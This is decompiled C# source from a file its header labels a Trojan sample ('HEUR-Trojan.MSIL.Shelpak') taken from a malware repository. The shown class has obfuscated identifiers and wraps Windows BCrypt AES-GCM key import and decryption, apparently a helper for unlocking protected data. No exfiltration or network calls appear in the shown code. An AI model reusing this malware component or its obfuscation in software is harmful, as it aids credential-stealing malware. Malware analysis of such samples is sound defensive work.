// Decompiled with JetBrains decompiler
// Type: 首干歹文豸人屮冂黃巛足缶.卩巾麥勹夂頁力亠夂厂走戈凵冂
// Assembly: correcthit, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 98A8C508-DCA7-4494-BD18-281291040E34
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Shelpak.gen-d9c811eae2b07eca77f74ca45e1efee2a2c91add3f8606c489f526eb43f55287.exe

using System;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;

namespace 首干歹文豸人屮冂黃巛足缶
{
  internal class 卩巾麥勹夂頁力亠夂厂走戈凵冂
  {
    public byte[] 鼠耒襾彳辰羊殳口行亅冖羽父子(
      byte[] 老冂夕比老高牛彡臼頁玉廾牛,
      byte[] 父辛山韋冂二尢山自艸廾水龜矢人攴夊父,
      byte[] 臣毋谷冂衣癶髟口卩尢支小臼气匚,
      byte[] 見夊釆缶毛冖卩非田宀黃飛,
      byte[] 臣鼎囗鼎巛衣香豆夂止气尢)
    {
      IntPtr num1 = this.舛人十虍見儿广彡亅火彐歹足勹麥(禾立襾皿囗衣鬥衣示夊宀厶頁.十龠乙言戈土寸土門手大, 禾立襾皿囗衣鬥衣示夊宀厶頁.比凵釆鼎彳曰辵支言足凵穴片斤匚足, 禾立襾皿囗衣鬥衣示夊宀厶頁.爻手隶辵止黃儿支火貝夊);
      IntPtr 止子鼠革水白子豕月厂舛毋心;
      IntPtr hglobal = this.犬夂文貝文冂麥豸弋米歹里(num1, 老冂夕比老高牛彡臼頁玉廾牛, out 止子鼠革水白子豕月厂舛毋心);
      禾立襾皿囗衣鬥衣示夊宀厶頁.爻子自厶夕長士勹尸雨 土丿弓瓜足冂廴入囗儿几辵幺比赤 = new 禾立襾皿囗衣鬥衣示夊宀厶頁.爻子自厶夕長士勹尸雨(父辛山韋冂二尢山自艸廾水龜矢人攴夊父, 臣毋谷冂衣癶髟口卩尢支小臼气匚, 臣鼎囗鼎巛衣香豆夂止气尢);
      byte[] 弋面戈己山弋谷夂支方土勹厂;
      using (土丿弓瓜足冂廴入囗儿几辵幺比赤)
      {
        byte[] 豕骨木屮音女口心匸彐廾卩子 = new byte[this.竹邑白木乙殳丿竹赤入禸食入(num1)];
        int 心月干巾竹牙疋屮齊色父匕皮 = 0;
        uint num2 = 禾立襾皿囗衣鬥衣示夊宀厶頁.八鹵冖气爿匚勹勹勹門歹(止子鼠革水白子豕月厂舛毋心, 見夊釆缶毛冖卩非田宀黃飛, 見夊釆缶毛冖卩非田宀黃飛.Length, ref 土丿弓瓜足冂廴入囗儿几辵幺比赤, 豕骨木屮音女口心匸彐廾卩子, 豕骨木屮音女口心匸彐廾卩子.Length, (byte[]) null, 0, ref 心月干巾竹牙疋屮齊色父匕皮, 0);
        if (num2 != 0U)
          throw new CryptographicException(string.Format("BCrypt.BCryptDecrypt() (get size) failed with status code: {0}", (object) num2));
        弋面戈己山弋谷夂支方土勹厂 = new byte[心月干巾竹牙疋屮齊色父匕皮];
        uint num3 = 禾立襾皿囗衣鬥衣示夊宀厶頁.八鹵冖气爿匚勹勹勹門歹(止子鼠革水白子豕月厂舛毋心, 見夊釆缶毛冖卩非田宀黃飛, 見夊釆缶毛冖卩非田宀黃飛.Length, ref 土丿弓瓜足冂廴入囗儿几辵幺比赤, 豕骨木屮音女口心匸彐廾卩子, 豕骨木屮音女口心匸彐廾卩子.Length, 弋面戈己山弋谷夂支方土勹厂, 弋面戈己山弋谷夂支方土勹厂.Length, ref 心月干巾竹牙疋屮齊色父匕皮, 0);
        if ((int) num3 == (int) 禾立襾皿囗衣鬥衣示夊宀厶頁.高比耳彐鼓爿牛弓行聿)
          throw new CryptographicException("BCrypt.BCryptDecrypt(): authentication tag mismatch");
        if (num3 != 0U)
          throw new CryptographicException(string.Format("BCrypt.BCryptDecrypt() failed with status code:{0}", (object) num3));
      }
      int num4 = (int) 禾立襾皿囗衣鬥衣示夊宀厶頁.癶襾幺口巛鼓又至亅己二尢(止子鼠革水白子豕月厂舛毋心);
      Marshal.FreeHGlobal(hglobal);
      int num5 = (int) 禾立襾皿囗衣鬥衣示夊宀厶頁.文歹瓦見匚麻首气尢水十殳工弓(num1, 0U);
      return 弋面戈己山弋谷夂支方土勹厂;
    }

    private int 竹邑白木乙殳丿竹赤入禸食入(IntPtr 豆冫凵玉斗毛己赤日玄土匸臣鬲)
    {
      byte[] numArray = this.夂毛人丶角殳龠片音非凵而工辰(豆冫凵玉斗毛己赤日玄土匸臣鬲, 禾立襾皿囗衣鬥衣示夊宀厶頁.巛疋豸日羽宀宀黽雨鬼戶里方);
      return BitConverter.ToInt32(new byte[4]
      {
        numArray[4],
        numArray[5],
        numArray[6],
        numArray[7]
      }, 0);
    }

    private IntPtr 舛人十虍見儿广彡亅火彐歹足勹麥(
      string 亠貝工匸心己文匸囗匸卜鼓,
      string 彐毋釆彡戈目毛匸匕飛酉戶,
      string 刀身阜厂隹阜卜心小亠歹)
    {
      IntPtr 黃厂曰冂亅弋儿幺欠厂骨邑 = IntPtr.Zero;
      uint num1 = 禾立襾皿囗衣鬥衣示夊宀厶頁.米鬲馬父見丿而豸女臣巛(out 黃厂曰冂亅弋儿幺欠厂骨邑, 亠貝工匸心己文匸囗匸卜鼓, 彐毋釆彡戈目毛匸匕飛酉戶, 0U);
      if (num1 != 0U)
        throw new CryptographicException(string.Format("BCrypt.BCryptOpenAlgorithmProvider() failed with status code:{0}", (object) num1));
      byte[] bytes = Encoding.Unicode.GetBytes(刀身阜厂隹阜卜心小亠歹);
      uint num2 = 禾立襾皿囗衣鬥衣示夊宀厶頁.鼓又月耒犬殳鳥艮己酉貝工鬥女(黃厂曰冂亅弋儿幺欠厂骨邑, 禾立襾皿囗衣鬥衣示夊宀厶頁.黹白身爿爻虫心長革屮己方, bytes, bytes.Length, 0);
      if (num2 != 0U)
        throw new CryptographicException(string.Format("BCrypt.BCryptSetAlgorithmProperty(BCrypt.BCRYPT_CHAINING_MODE, BCrypt.BCRYPT_CHAIN_MODE_GCM) failed with status code:{0}", (object) num2));
      return 黃厂曰冂亅弋儿幺欠厂骨邑;
    }

    private IntPtr 犬夂文貝文冂麥豸弋米歹里(
      IntPtr 竹豆廴鹿韋斤目舛斤丿,
      byte[] 日毛飛襾广玄子凵老幺一頁欠,
      out IntPtr 止子鼠革水白子豕月厂舛毋心)
    {
      int int32 = BitConverter.ToInt32(this.夂毛人丶角殳龠片音非凵而工辰(竹豆廴鹿韋斤目舛斤丿, 禾立襾皿囗衣鬥衣示夊宀厶頁.自冖甘皮方幺木小攴水方木), 0);
      IntPtr 己戈斤女麻彳缶瓜幺干心弓 = Marshal.AllocHGlobal(int32);
      byte[] 戶卩爪方辵目寸冫耒勹米 = this.犬片門歹夂二戈巛田疒齊冫(禾立襾皿囗衣鬥衣示夊宀厶頁.丨匕尢生辵几石甘弓冂彡匸雨, BitConverter.GetBytes(1), BitConverter.GetBytes(日毛飛襾广玄子凵老幺一頁欠.Length), 日毛飛襾广玄子凵老幺一頁欠);
      uint num = 禾立襾皿囗衣鬥衣示夊宀厶頁.玄干彡廴老靑立乙几文彐黍(竹豆廴鹿韋斤目舛斤丿, IntPtr.Zero, 禾立襾皿囗衣鬥衣示夊宀厶頁.网干門木亠方皿尸辰舟月爪大, out 止子鼠革水白子豕月厂舛毋心, 己戈斤女麻彳缶瓜幺干心弓, int32, 戶卩爪方辵目寸冫耒勹米, 戶卩爪方辵目寸冫耒勹米.Length, 0U);
      if (num != 0U)
        throw new CryptographicException(string.Format("BCrypt.BCryptImportKey() failed with status code:{0}", (object) num));
      return 己戈斤女麻彳缶瓜幺干心弓;
    }

    private byte[] 夂毛人丶角殳龠片音非凵而工辰(IntPtr 邑无广入艸足匸肉亠貝又石干斤, string 力爪爿巾又卩老羽广弋彳血)
    {
      int 弋厶鬲寸缶里鼎老戶骨老角匸斤 = 0;
      uint num1 = 禾立襾皿囗衣鬥衣示夊宀厶頁.釆彐尢豆火几己水木片支(邑无广入艸足匸肉亠貝又石干斤, 力爪爿巾又卩老羽广弋彳血, (byte[]) null, 0, ref 弋厶鬲寸缶里鼎老戶骨老角匸斤, 0U);
      if (num1 != 0U)
        throw new CryptographicException(string.Format("BCrypt.BCryptGetProperty() (get size) failed with status code:{0}", (object) num1));
      byte[] 曰幺牙卩十一立人卩气釆艸身 = new byte[弋厶鬲寸缶里鼎老戶骨老角匸斤];
      uint num2 = 禾立襾皿囗衣鬥衣示夊宀厶頁.釆彐尢豆火几己水木片支(邑无广入艸足匸肉亠貝又石干斤, 力爪爿巾又卩老羽广弋彳血, 曰幺牙卩十一立人卩气釆艸身, 曰幺牙卩十一立人卩气釆艸身.Length, ref 弋厶鬲寸缶里鼎老戶骨老角匸斤, 0U);
      if (num2 != 0U)
        throw new CryptographicException(string.Format("BCrypt.BCryptGetProperty() failed with status code:{0}", (object) num2));
      return 曰幺牙卩十一立人卩气釆艸身;
    }

    public byte[] 犬片門歹夂二戈巛田疒齊冫(params byte[][] 牛八丿冖行丶隹鳥火耒鹵)
    {
      int num = 0;
      foreach (byte[] numArray in 牛八丿冖行丶隹鳥火耒鹵)
      {
        if (numArray != null)
          num += numArray.Length;
      }
      byte[] dst = new byte[num - 1 + 1];
      int dstOffset = 0;
      foreach (byte[] src in 牛八丿冖行丶隹鳥火耒鹵)
      {
        if (src != null)
        {
          Buffer.BlockCopy((Array) src, 0, (Array) dst, dstOffset, src.Length);
          dstOffset += src.Length;
        }
      }
      return dst;
    }
  }
}
